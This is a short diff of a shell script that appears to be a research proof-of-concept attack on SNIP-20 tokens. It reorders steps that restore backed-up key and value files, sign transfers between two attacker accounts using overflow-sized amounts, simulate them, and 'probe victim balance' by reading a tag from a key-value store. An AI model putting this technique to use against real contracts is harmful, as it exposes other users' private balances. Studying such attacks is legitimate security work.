@@ -161,18 +161,17 @@ for i in {1..114}; do
     #show_attacker_balances
 done
 
-amount=$(bc <<< "2^128 - 1 - ${amount}")
-generate_and_sign_transfer ${attacker1} ${attacker2} $amount snip20_boost_1
 cp -f $BACKUP/backup_adv_key $BACKUP/adv_key
 cp -f $BACKUP/backup_adv_value $BACKUP/adv_value
-
+amount=$(bc <<< "2^128 - 1 - ${amount}")
+generate_and_sign_transfer ${attacker1} ${attacker2} $amount snip20_boost_1
 simulate_tx snip20_boost_1
 
 # probe victim balance
-amount=$(bc <<< "2^128 - 1")
-generate_and_sign_transfer ${attacker2} ${attacker1} $amount snip20_getkey
 rm -f $BACKUP/kv_store
 touch $BACKUP/kv_store
+amount=$(bc <<< "2^128 - 1")
+generate_and_sign_transfer ${attacker2} ${attacker1} $amount snip20_getkey
 simulate_tx snip20_getkey
 
 tag=$(sed '3q;d' $BACKUP/kv_store)
